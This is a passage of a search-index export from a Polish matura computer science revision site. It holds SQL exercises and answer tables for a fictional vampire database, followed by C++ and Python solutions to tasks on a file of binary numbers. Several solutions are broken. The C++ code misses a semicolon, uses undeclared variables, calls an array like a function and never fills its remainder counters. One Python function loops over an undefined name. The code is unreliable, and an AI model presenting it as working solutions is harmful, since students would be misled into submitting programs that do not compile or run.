ofiar\u0119 jest r\u00f3wna jej dacie zgonu. Posortuj alfabetycznie po imionach.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#zadanie-9","title":"Zadanie 9","text":"<p>Utw\u00f3rz zestawienie zawieraj\u0105ce nazw\u0119 kraju, liczb\u0119 wampir\u00f3w pochodz\u0105cych z tego kraju, liczb\u0119 klan\u00f3w za\u0142o\u017conych w tym kraju, oraz liczb\u0119 atak\u00f3w przeprowadzonych w tym kraju. Posortuj alfabetycznie po nazwie kraju.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#zadanie-10","title":"Zadanie 10","text":"<p>Wypisz nazwy wszystkich klan\u00f3w, kt\u00f3re nie posiadaj\u0105 cz\u0142onk\u00f3w. Posortuj alfabetycznie po nazwach.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#zadanie-11","title":"Zadanie 11","text":"<p>Utw\u00f3rz zestawienie zawieraj\u0105ce imi\u0119 wampira oraz zaokr\u0105glone w g\u00f3r\u0119: liczb\u0119 dni, liczb\u0119 miesi\u0119cy i liczb\u0119 lat, kt\u00f3re up\u0142yn\u0119\u0142y od urodzin do przemiany. Wyniki posortuj alfabetycznie po imionach.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#zadanie-12","title":"Zadanie 12","text":"<p>Utw\u00f3rz zestawienie zawieraj\u0105ce imi\u0119 wampira, jego dat\u0119 urodzenia, dat\u0119 przemiany oraz wiek wampira w momencie przemiany. Wyniki posortuj alfabetycznie po imionach.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#zadanie-13","title":"Zadanie 13","text":"<p>Utw\u00f3rz zestawienie zawieraj\u0105ce imi\u0119 ofiary oraz liczb\u0119 dni, kt\u00f3re up\u0142yn\u0119\u0142y od pierwszego do ostatniego ataku.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/database/vampires/answers/#zadanie-1","title":"Zadanie 1","text":"Imie Dracula Vlad"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/answers/#zadanie-2","title":"Zadanie 2","text":"Imie LiczbaAtakow Drusilla 1 Ambrogio 1 Murnau 2 Orlok 3 Carmilla 3 Akasha 3 Vlad 4 Dracula 5"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/answers/#zadanie-3","title":"Zadanie 3","text":"Imie DataPrzemiany DataPierwszegoAtaku Carmilla 04.04.1525 03.02.1538 Ambrogio 08.01.2021 19.02.2035 Dracula 24.07.1252 18.08.1275 Drusilla 10.12.2203 06.06.2250 Vlad 06.10.1280 12.03.1342 Akasha 08.05.2099 13.07.2172 Orlok 04.05.1812 11.06.1899 Murnau 02.02.1381 13.05.1538"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/answers/#zadanie-4","title":"Zadanie 4","text":"Imie Lestat Selene Varney"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/answers/#zadanie-5","title":"Zadanie 5","text":"Imie Varney"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/answers/#zadanie-6","title":"Zadanie 6","text":"Ofiary.Imie Wampiry.Imie Nazwa DataAtaku Maria Dracula Czerwony Cien 02.06.1345 Johann Dracula Czerwony Cien 18.08.1275 Franz Dracula Czerwony Cien 04.04.1595 Louise Dracula Czerwony Cien 01.08.1612 Elizabeth Vlad Ksiezycowy Rod 02.11.1366 Thomas Orlok Czerwony Cien 11.06.1899 Anastasia Orlok Czerwony Cien 12.02.1999 Giovanni Orlok Czerwony Cien 19.01.2036 Nefertari Akasha Krwiopijcy Nocy 13.07.2172 Seamus Akasha Krwiopijcy Nocy 02.12.2255 Hutter Carmilla Wladcy Mroku 03.02.1538 Maria Vlad Ksiezycowy Rod 03.12.1344 Maria Vlad Ksiezycowy Rod 12.03.1342 Louise Murnau Wieczni Stroze 11.09.1611 Louise Carmilla Wladcy Mroku 10.09.1611 Louise Carmilla Wladcy Mroku 09.09.1611 Giovanni Ambrogio Wieczni Stroze 19.02.2035 Seamus Dracula Czerwony Cien 12.11.2254 Seamus Vlad Ksiezycowy Rod 07.11.2253 Nefertari Akasha Krwiopijcy Nocy 02.08.2173 Seamus Drusilla Bezsenne Dusze 06.06.2250 Hutter Murnau Wieczni Stroze 13.05.1538"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/answers/#zadanie-7","title":"Zadanie 7","text":"Imie LiczbaAtakow Anastasia 1 Elizabeth 1 Franz 1 Giovanni 2 Hutter 2 Johann 1 Louise 4 Maria 3 Nefertari 2 Seamus 4 Thomas 1"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/answers/#zadanie-8","title":"Zadanie 8","text":"Imie Elizabeth Franz Giovanni Johann Maria Seamus"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/answers/#zadanie-9","title":"Zadanie 9","text":"Kraj LiczbaWampirow LiczbaKlanow LiczbaAtakow Anglia 1 0 0 Dania 0 1 1 Egipt 1 0 1 Francja 2 1 2 Grecja 1 0 0 Hiszpania 0 1 0 Irlandia 1 0 0 Niemcy 1 1 1 Norwegia 0 1 0 Polska 0 1 4 Rumunia 2 0 5 Szwecja 0 1 0 Wegry 1 1 1 Wielka Brytania 0 1 0 Wlochy 1 1 0"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/answers/#zadanie-10","title":"Zadanie 10","text":"Nazwa Gwiazdy Zmierzchu Srebrne Kly Zakon Czarnego Sztyletu"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/answers/#zadanie-11","title":"Zadanie 11","text":"Imie LiczbaDni LiczbaMiesiecy LiczbaLat Akasha 3895 128 11 Ambrogio 19867 653 55 Carmilla 16467 541 45 Dracula 6263 205 17 Drusilla 11379 374 31 Lestat 33297 1094 91 Murnau 731 24 2 Orlok 29189 959 80 Selene 10139 333 27 Varney 42024 1380 115 Vlad 267 9 0"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/answers/#zadanie-12","title":"Zadanie 12","text":"Imie DataUrodzenia DataPrzemiany Wiek Akasha 07.09.2088 08.05.2099 10 Ambrogio 18.08.1966 08.01.2021 54 Carmilla 03.03.1480 04.04.1525 45 Dracula 01.06.1235 24.07.1252 17 Drusilla 13.10.2172 10.12.2203 31 Lestat 05.02.1581 05.04.1672 91 Murnau 02.02.1379 02.02.1381 2 Orlok 03.06.1732 04.05.1812 79 Selene 12.03.1876 16.12.1903 27 Varney 01.02.1688 23.02.1803 115 Vlad 13.01.1280 06.10.1280 0"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/answers/#zadanie-13","title":"Zadanie 13","text":"Imie OdPierwszegoDoOstatniego Anastasia 0 Elizabeth 0 Franz 0 Giovanni 334 Hutter 99 Johann 0 Louise 327 Maria 1178 Nefertari 385 Seamus 2005 Thomas 0"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/solution/","title":"Rozwi\u0105zanie","text":"<p> Rozwi\u0105zanie</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/","title":"Liczby binarne","text":"<p>W pliku liczby.txt znajduje si\u0119 \\(1000\\) liczb binarnych zapisanych w osobnych wierszach. Wszystkie liczby maj\u0105 od \\(2\\) do \\(16\\) znak\u00f3w.</p> <p> liczby.txt</p> <p>Napisz program/programy rozwi\u0105zuj\u0105ce poni\u017csze zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/#zadanie-1","title":"Zadanie 1","text":"<p>Podaj, ile jest w pliku liczb parzystych.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/#zadanie-2","title":"Zadanie 2","text":"<p>Podaj, ile jest w pliku liczb podzielnych przez \\(4\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/#zadanie-3","title":"Zadanie 3","text":"<p>Podaj, ile jest w pliku liczb podzielnych przez \\(10\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/#zadanie-4","title":"Zadanie 4","text":"<p>Podaj, ile jest w pliku liczb b\u0119d\u0105cych pot\u0119g\u0105 dw\u00f3jki.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/#zadanie-5","title":"Zadanie 5","text":"<p>Podaj, ile jest w pliku liczb, kt\u00f3re maj\u0105 w swoim zapisie wi\u0119cej zer ni\u017c jedynek.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/#zadanie-6","title":"Zadanie 6","text":"<p>Podaj, ile jest w pliku liczb, kt\u00f3re maj\u0105 w swoim zapisie wi\u0119cej jedynek ni\u017c zer.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/#zadanie-7","title":"Zadanie 7","text":"<p>Podaj, ile jest w pliku liczb, kt\u00f3re maj\u0105 w swoim zapisie tyle samo zer co jedynek.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/#zadanie-8","title":"Zadanie 8","text":"<p>Podaj najwi\u0119ksz\u0105 i najmniejsz\u0105 liczb\u0119 z pliku.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/#zadanie-9","title":"Zadanie 9","text":"<p>Policz i podaj, ile jest r\u00f3\u017cnych liczb w pliku.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/#zadanie-10","title":"Zadanie 10","text":"<p>Policz i podaj, ile liczb z pliku ma reszt\u0119 z dzielenia przez \\(4\\) r\u00f3wn\u0105 \\(0\\), ile r\u00f3wn\u0105 \\(1\\), ile r\u00f3wn\u0105 \\(2\\), a ile r\u00f3wn\u0105 \\(3\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/#zadanie-11","title":"Zadanie 11","text":"<p>Policz i podaj, ile jest liczb w pliku, kt\u00f3re maj\u0105 jedynki tylko na nieparzystych miejscach (licz\u0105c od lewej, czyli od cyfry najbardziej znacz\u0105cej). Np. liczby \\(101\\), \\(100\\), \\(10001\\) maj\u0105 jedynki tylko na nieparzystych miejscach. Podaj pierwsz\u0105 i ostatni\u0105 tak\u0105 liczb\u0119.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/#zadanie-12","title":"Zadanie 12","text":"<p>Znajd\u017a w pliku najd\u0142u\u017cszy sp\u00f3jny podci\u0105g rosn\u0105cy tzn. taki ci\u0105g s\u0105siednich liczb binarnych, \u017ce ka\u017cda kolejna warto\u015b\u0107 jest wi\u0119ksza od poprzedniej. Wypisz ten podci\u0105g. Podaj jego d\u0142ugo\u015b\u0107 (liczb\u0119 element\u00f3w), pocz\u0105tek (pozycj\u0119 pierwszej warto\u015bci) i koniec (pozycj\u0119 ostatniej warto\u015bci w pliku).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-cpp/","title":"C++ - rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-cpp/#wczytanie-danych","title":"Wczytanie danych","text":"<p>Zacznijmy od wczytania danych z pliku. Liczby s\u0105 zapisane osobno w ka\u017cdej linii, wi\u0119c ich wczytanie jest proste. Wczytane liczby binarne w postaci tekstowej zapiszemy w li\u015bcie nazwanej <code>binaryNumbersTab</code>.</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nvoid readData(string binaryNumbersTab[]) {\n    ifstream dataFile(\"liczby.txt\");\n\n    for (int i = 0; i &lt; 1000; i++) {\n        dataFile &gt;&gt; binaryNumbersTab[i];\n    }\n\n    dataFile.close();\n}\n\nint main() {\n    string binaryNumbersTab[1000];\n\n    readData(binaryNumbersTab);\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-cpp/#zadanie-1","title":"Zadanie 1","text":"<p>Aby sprawdzi\u0107, czy liczba binarna jest parzysta, wystarczy spojrze\u0107 na jej ostatni\u0105 (najmniej znacz\u0105c\u0105) cyfr\u0119.</p> <pre><code>int countEven(string binaryNumbersTab[]) {\n    int count = 0;  // Licznik liczb parzystych\n    for (int i = 0; i &lt; 1000; i++) {\n        string binary = binaryNumbersTab[i];\n        if (binary[binary.size() - 1] == '0') {  // Je\u017celi ostatni znak liczby binarnej to 0\n            count++;  // zwi\u0119kszamy licznik liczb parzystych\n        }\n    }\n\n    return count;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-cpp/#zadanie-2","title":"Zadanie 2","text":"<p>Aby sprawdzi\u0107, czy liczba binarna jest podzielna przez \\(4\\) wystarczy sprawdzi\u0107 jej dwie ostatnie (najmniej znacz\u0105ce) cyfry. Je\u017celi s\u0105 r\u00f3wne \\(0\\), to liczba jest podzielna przez \\(4\\).</p> <pre><code>int countDivisibleBy4(string binaryNumbersTab[]) {\n    int count = 0;\n    for (int i = 0; i &lt; 1000; i++) {\n        string binary = binaryNumbersTab[i];\n        if (binary[binary.size() - 1] == '0' &amp;&amp; binary[binary.size() - 2] == '0') {\n            count++;\n        }\n    }\n\n    return count;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-cpp/#zadanie-3","title":"Zadanie 3","text":"<p>Zamieniamy liczb\u0119 binarn\u0105 na system dziesi\u0119tny i sprawdzamy podzielno\u015b\u0107 przez 10 za pomoc\u0105 operatora modulo (reszty z dzielenia).</p> <pre><code>int binaryToDecimal(string binary) {  // Funkcja konwertuj\u0105ca liczb\u0119 binarn\u0105 reprezentowan\u0105 jako tekst na liczb\u0119 naturaln\u0105 w systemie dziesi\u0119tnym\n    int decimal = 0;  // Warto\u015b\u0107 w systemie 10\n    int power = 1;  // Pot\u0119ga 2\n    // Idziemy p\u0119tl\u0105 od ko\u0144ca\n    for (int i = binary.size() - 1; i &gt;= 0; i--) {\n        decimal += (binary[i] - '0') * power;  // Przemna\u017camy cyfr\u0119 przez pot\u0119g\u0119 dw\u00f3jki\n        power *= 2;  // Zwi\u0119kszamy pot\u0119g\u0119 dw\u00f3jki\n    }\n\n    return decimal;\n}\n\nint countDivisibleBy10(string binaryNumbersTab[]) {\n    int count = 0;\n    for (int i = 0; i &lt; 1000; i++) {\n        string binary = binaryNumbersTab[i];\n        int decimal = binaryToDecimal(binary)\n        if (decimal % 10 == 0) {\n            count++;\n        }\n    }\n\n    return count;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-cpp/#zadanie-4","title":"Zadanie 4","text":"<p>Liczba binarna jest pot\u0119g\u0105 dw\u00f3jki, je\u017celi w jej zapisie wyst\u0119puje dok\u0142adnie jedna jedynka.</p> <pre><code>#include &lt;map&gt;\n\nint countPowerOf2(string binaryNumbersTab[]) {\n    int count = 0;\n    for (int i = 0; i &lt; 1000; i++) {\n        string binary = binaryNumbersTab[i];\n        map&lt;char, int&gt; digitCounter;  // S\u0142ownik do zliczania cyfr 0 i 1\n        digitCounter['0'] = 0;  // Inicjalizujemy liczniki zer i jedynek\n        digitCounter['1'] = 0;\n        for (int pos = 0; pos &lt; binary.size(); pos++) {  // Dla ka\u017cdej cyfry w zapisie liczby binarnej\n            char digit = binary[pos];\n            digitCounter[digit]++;  // Zwi\u0119kszamy licznik dla danej cyfry\n        }\n\n        if (digitCounter['1'] == 1) {\n            count++;\n        }\n    }\n\n    return count;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-cpp/#zadanie-5","title":"Zadanie 5","text":"<pre><code>#include &lt;map&gt;\n\nint countMoreZeroes(string binaryNumbersTab[]) {\n    int count = 0;\n    for (int i = 0; i &lt; 1000; i++) {\n        string binary = binaryNumbersTab[i];\n        map&lt;char, int&gt; digitCounter;  // S\u0142ownik do zliczania cyfr 0 i 1\n        digitCounter['0'] = 0;  // Inicjalizujemy liczniki zer i jedynek\n        digitCounter['1'] = 0;\n        for (int pos = 0; pos &lt; binary.size(); pos++) {  // Dla ka\u017cdej cyfry w zapisie liczby binarnej\n            char digit = binary[pos];\n            digitCounter[digit]++;  // Zwi\u0119kszamy licznik dla danej cyfry\n        }\n\n        if (digitCounter['0'] &gt; digitCounter['1']) {\n            count++;\n        }\n    }\n\n    return count;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-cpp/#zadanie-6","title":"Zadanie 6","text":"<pre><code>#include &lt;map&gt;\n\nint countMoreOnes(string binaryNumbersTab[]) {\n    int count = 0;\n    for (int i = 0; i &lt; 1000; i++) {\n        string binary = binaryNumbersTab[i];\n        map&lt;char, int&gt; digitCounter;  // S\u0142ownik do zliczania cyfr 0 i 1\n        digitCounter['0'] = 0;  // Inicjalizujemy liczniki zer i jedynek\n        digitCounter['1'] = 0;\n        for (int pos = 0; pos &lt; binary.size(); pos++) {  // Dla ka\u017cdej cyfry w zapisie liczby binarnej\n            char digit = binary[pos];\n            digitCounter[digit]++;  // Zwi\u0119kszamy licznik dla danej cyfry\n        }\n\n        if (digitCounter['1'] &gt; digitCounter['0']) {\n            count++;\n        }\n    }\n\n    return count;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-cpp/#zadanie-7","title":"Zadanie 7","text":"<pre><code>#include &lt;map&gt;\n\nint countEqualZeroesAndOnes(string binaryNumbersTab[]) {\n    int count = 0;\n    for (int i = 0; i &lt; 1000; i++) {\n        string binary = binaryNumbersTab[i];\n        map&lt;char, int&gt; digitCounter;  // S\u0142ownik do zliczania cyfr 0 i 1\n        digitCounter['0'] = 0;  // Inicjalizujemy liczniki zer i jedynek\n        digitCounter['1'] = 0;\n        for (int pos = 0; pos &lt; binary.size(); pos++) {  // Dla ka\u017cdej cyfry w zapisie liczby binarnej\n            char digit = binary[pos];\n            digitCounter[digit]++;  // Zwi\u0119kszamy licznik dla danej cyfry\n        }\n\n        if (digitCounter['1'] == digitCounter['0']) {\n            count++;\n        }\n    }\n\n    return count;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-cpp/#zadanie-8","title":"Zadanie 8","text":"<pre><code>int binaryToDecimal(string binary) {\n    int decimal = 0;\n    int power = 1;\n    for (int i = binary.size() - 1; i &gt;= 0; i--) {\n        decimal += (binary[i] - '0') * power;\n        power *= 2;\n    }\n\n    return decimal;\n}\n\nvoid findMinMax(string binaryNumbersTab[]) {\n    int minDec = binaryToDecimal(binaryNumbersTab[0]);\n    string minBin = binaryNumbersTab[0];\n    int maxDec = minDec;\n    string maxBin = binaryNumbersTab[0];\n    for (int i = 1; i &lt; 1000; i++) {\n        string binary = binaryNumbersTab[i];\n        decimal = binaryToDecimal(binary);\n\n        if (decimal &lt; minDec) {\n            minDec = decimal;\n            minBin = binary;\n        }\n\n        if (decimal &gt; maxDec) {\n            maxDec = decimal;\n            maxBin = binary;\n        }\n    }\n\n    cout &lt;&lt; minBin &lt;&lt; endl;\n    cout &lt;&lt; maxBin &lt;&lt; endl;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-cpp/#zadanie-9","title":"Zadanie 9","text":"<pre><code>#include &lt;set&gt;\n\nint countUnique(string binaryNumbersTab[]) {\n    set&lt;string&gt; binaryNumbersSet;\n    for (int i = 0; i &lt; 1000; i++) {\n        string binary = binaryNumbersTab[i];\n        binaryNumbersSet.insert(binary);\n    }\n\n    return binaryNumbersSet.size(); \n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-cpp/#zadanie-10","title":"Zadanie 10","text":"<pre><code>#include &lt;map&gt;\n\nvoid count4Rest(string binaryNumbersTab[]) {\n    map &lt;string, int&gt; dictCounter;\n    // Tworzymy s\u0142ownik licznik\u00f3w, kt\u00f3ry inicjalizujemy r\u00f3\u017cnymi ko\u0144c\u00f3wkami liczb binarnych, kt\u00f3re odpowiadaj\u0105 kolejnym resztom z dzielenia przez 4\n    dictCounter[\"00\"] = 0;\n    dictCounter[\"01\"] = 0;\n    dictCounter[\"10\"] = 0;\n    dictCounter[\"11\"] = 0;\n    for (int i = 0; i &lt; 1000; i++) {\n        string binary = binaryNumbersTab[i];\n        string lastTwo = \"\" + binary[binary.size() - 2] + binary[binary.size() - 1];  // Zwi\u0119kszamy odpowiedni licznik\n    }\n\n    cout &lt;&lt; restCounter[\"00\"] &lt;&lt; endl;\n    cout &lt;&lt; restCounter[\"01\"] &lt;&lt; endl;\n    cout &lt;&lt; restCounter[\"10\"] &lt;&lt; endl;\n    cout &lt;&lt; restCounter[\"11\"] &lt;&lt; endl;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-cpp/#zadanie-11","title":"Zadanie 11","text":"<pre><code>int count1OnOdds(string binaryNumbersTab[]) {\n    int count = 0;\n    for (int i = 0; i &lt; 1000; i++) {\n        string binary = binaryNumbersTab[i];\n        bool correct = true;\n        for (int pos = 0; pos &lt; binary.size(); pos++) {\n            if ((pos + 1) % 2 == 0 &amp;&amp; binary[pos] == '1') {  // Sprawdzamy, czy jedynka pojawi\u0142a si\u0119 na parzystej pozycji\n                correct = false;\n                break;\n            }\n        }\n\n        if (correct) {\n            count++;\n        }\n    }\n\n    return count;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-cpp/#zadanie-12","title":"Zadanie 12","text":"<pre><code>int binaryToDecimal(string binary) {\n    int decimal = 0;\n    int power = 1;\n    for (int i = binary.size() - 1; i &gt;= 0; i--) {\n        decimal += (binary[i] - '0') * power;\n        power *= 2;\n    }\n\n    return decimal;\n}\n\nvoid findLongestGrowingSubstring(string binaryNumbersTab[]) {\n    int maxLength = 1;  // D\u0142ugo\u015b\u0107 najd\u0142u\u017cszego podci\u0105gu rosn\u0105cego\n    int maxFirstIndex = 0;  // Indeks pierwszej warto\u015bci w najd\u0142u\u017cszym podci\u0105gu rosn\u0105cym\n\n    int currentLength = 1;  // D\u0142ugo\u015b\u0107 obecnie obliczanego ci\u0105gu\n    int currentFirstIndex = 0;  // Indeks pierwszej warto\u015bci w obecnie obliczanym ci\u0105gu\n\n    for (int i = 1; index &lt; 1000; i++) {\n        // Por\u00f3wnujemy obecn\u0105 warto\u015b\u0107 z poprzedni\u0105\n        if (binaryToDecimal(binaryNumbersTab[i]) &gt; binaryToDecimal(binaryNumbersTab[i - 1])) {\n            currentLength++;\n        } else {\n            currentLength = 1;\n            currentFirstIndex = i;\n        }\n\n        if currentLength &gt; maxLength {\n            maxLength = currentLength;\n            maxFirstIndex = currentFirstIndex;\n        }\n    }\n\n    cout &lt;&lt; \"D\u0142ugo\u015b\u0107: \" &lt;&lt; maxLength &lt;&lt; endl;\n    cout &lt;&lt; \"Indeks pierwszego el. :\" &lt;&lt; maxFirstIndex &lt;&lt; endl;\n    cout &lt;&lt; \"Indeks ostatniego el.: \" &lt;&lt; maxFirstIndex + maxLength - 1 &lt;&lt; endl;\n    maxLastIndex = maxFirstIndex + maxLength;\n    for(int i = 0; i &lt; 1000; i++) {\n        cout &lt;&lt; binaryNumbersTab(maxFirstIndex + i);\n    }\n\n    cout &lt;&lt; endl;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-python/","title":"Python - rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-python/#wczytanie-danych","title":"Wczytanie danych","text":"<p>Zacznijmy od wczytania danych z pliku. Liczby s\u0105 zapisane osobno w ka\u017cdej linii, wi\u0119c ich wczytanie jest proste. Wczytane liczby binarne w postaci tekstowej zapiszemy w li\u015bcie nazwanej <code>binary_numbers_list</code>.</p> <pre><code>def read_data():\n    with open(\"liczby.txt\") as data_file:\n        binary_numbers_list = data_file.read().split(\"\\n\")\n\n    return binary_numbers_list\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-python/#zadanie-1","title":"Zadanie 1","text":"<p>Aby sprawdzi\u0107, czy liczba binarna jest parzysta, wystarczy spojrze\u0107 na jej ostatni\u0105 (najmniej znacz\u0105c\u0105) cyfr\u0119.</p> <pre><code>def count_even(binary_numbers_list):\n    count = 0  # Licznik liczb parzystych\n    for binary in binary_numbers_list:\n        if binary[-1] == \"0\":  # Je\u017celi ostatni znak liczby binarnej to 0\n            count += 1  # zwi\u0119kszamy licznik liczb parzystych\n\n    return count\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-python/#zadanie-2","title":"Zadanie 2","text":"<p>Aby sprawdzi\u0107, czy liczba binarna jest podzielna przez \\(4\\) wystarczy sprawdzi\u0107 jej dwie ostatnie (najmniej znacz\u0105ce) cyfry. Je\u017celi s\u0105 r\u00f3wne \\(0\\), to liczba jest podzielna przez \\(4\\).</p> <pre><code>def count_divisible_by_4(binary_numbers_list):\n    count = 0\n    for binary in binary_numbers_list:\n        if binary[-1] == \"0\" and binary[-2] == \"0\":\n            count += 1\n\n    return count\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-python/#zadanie-3","title":"Zadanie 3","text":"<p>Zamieniamy liczb\u0119 binarn\u0105 na system dziesi\u0119tny i sprawdzamy podzielno\u015b\u0107 przez 10 za pomoc\u0105 operatora modulo (reszty z dzielenia).</p> Rozwi\u0105zanie 1Rozwi\u0105zanie 2 <pre><code>def binary_to_decimal(binary):  # Funkcja konwertuj\u0105ca liczb\u0119 binarn\u0105 reprezentowan\u0105 jako tekst na liczb\u0119 naturaln\u0105 w systemie dziesi\u0119tnym\n    decimal = 0  # Warto\u015b\u0107 w systemie 10\n    power = 1  # Pot\u0119ga 2\n    # Idziemy p\u0119tl\u0105 od ko\u0144ca\n    for i in range(len(binary) - 1, -1, -1):\n        decimal += int(binary[i]) * power  # Przemna\u017camy cyfr\u0119 przez pot\u0119g\u0119 dw\u00f3jki\n        power *= 2  # Zwi\u0119kszamy pot\u0119g\u0119 dw\u00f3jki\n\n    return decimal\n\ndef count_divisible_by_10(binary_numbers_list):\n    count = 0\n    for binary in binary_numbers_list:\n        decimal = binary_to_decimal(binary)\n        if decimal % 10 == 0:\n            count += 1\n\n    return count\n</code></pre> <pre><code>def count_divisible_by_10(binary_numbers_list):\n    count = 0\n    for binary in binary_numbers_list:\n        decimal = int(binary, 2)  # Konwertujemy tekst na liczb\u0119 dziesi\u0119tn\u0105 za pomoc\u0105 funkcji int. Jej drugi parametr to podstawa systemu, z kt\u00f3rego dokonujemy konwersji.\n        if decimal % 10 == 0:\n            count += 1\n\n    return count\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-python/#zadanie-4","title":"Zadanie 4","text":"<p>Liczba binarna jest pot\u0119g\u0105 dw\u00f3jki, je\u017celi w jej zapisie wyst\u0119puje dok\u0142adnie jedna jedynka.</p> <pre><code>def count_power_of_2(binary_numbers_list):\n    count = 0\n    for binary in binary_numbers:\n        digit_counter = dict()  # S\u0142ownik do zliczania cyfr 0 i 1\n        digit_counter[\"0\"] = 0  # Inicjalizujemy liczniki zer i jedynek\n        digit_counter[\"1\"] = 0\n        for digit in binary:  # Dla ka\u017cdej cyfry w zapisie liczby binarnej\n            digit_counter[digit] += 1  # Zwi\u0119kszamy licznik dla danej cyfry\n\n        if digit_counter[\"1\"] == 1:\n            count += 1\n\n    return count\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-python/#zadanie-5","title":"Zadanie 5","text":"<pre><code>def count_more_zeroes(binary_numbers_list):\n    count = 0\n    for binary in binary_numbers_list:\n        digit_counter = dict()  # S\u0142ownik do zliczania cyfr 0 i 1\n        digit_counter[\"0\"] = 0  # Inicjalizujemy liczniki zer i jedynek\n        digit_counter[\"1\"] = 0\n        for digit in binary:  # Dla ka\u017cdej cyfry w zapisie liczby binarnej\n            digit_counter[digit] += 1  # Zwi\u0119kszamy licznik dla danej cyfry\n\n        if digit_counter[\"0\"] &gt; digit_counter[\"1\"]:\n            count += 1\n\n    return count\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-python/#zadanie-6","title":"Zadanie 6","text":"<pre><code>def count_more_ones(binary_numbers_list):\n    count = 0\n    for binary in binary_numbers_list:\n        digit_counter = dict()  # S\u0142ownik do zliczania cyfr 0 i 1\n        digit_counter[\"0\"] = 0  # Inicjalizujemy liczniki zer i jedynek\n        digit_counter[\"1\"] = 0\n        for digit in binary:  # Dla ka\u017cdej cyfry w zapisie liczby binarnej\n            digit_counter[digit] += 1  # Zwi\u0119kszamy licznik dla danej cyfry\n\n        if digit_counter[\"1\"] &gt; digit_counter[\"0\"]:\n            count += 1\n\n    return count\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-python/#zadanie-7","title":"Zadanie 7","text":"<pre><code>def count_equal_zeroes_and_ones(binary_numbers_list):\n    count = 0\n    for binary in binary_numbers_list:\n        digit_counter = dict()  # S\u0142ownik do zliczania cyfr 0 i 1\n        digit_counter[\"0\"] = 0  # Inicjalizujemy liczniki zer i jedynek\n        digit_counter[\"1\"] = 0\n        for digit in binary:  # Dla ka\u017cdej cyfry w zapisie liczby binarnej\n            digit_counter[digit] += 1  # Zwi\u0119kszamy licznik dla danej cyfry\n\n        if digit_counter[\"0\"] == digit_counter[\"1\"]:\n            count += 1\n\n    return count\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-python/#zadanie-8","title":"Zadanie 8","text":"<pre><code>def find_min_max(binary_numbers_list):\n    min_dec = 10000000000000\n    min_bin = \"\"\n    max_dec = 0\n    max_bin = \"\"\n    for binary in binary_numbers_list:\n        decimal = int(binary, 2)\n\n        if decimal &lt; min_dec:\n            min_dec = decimal\n            min_bin = 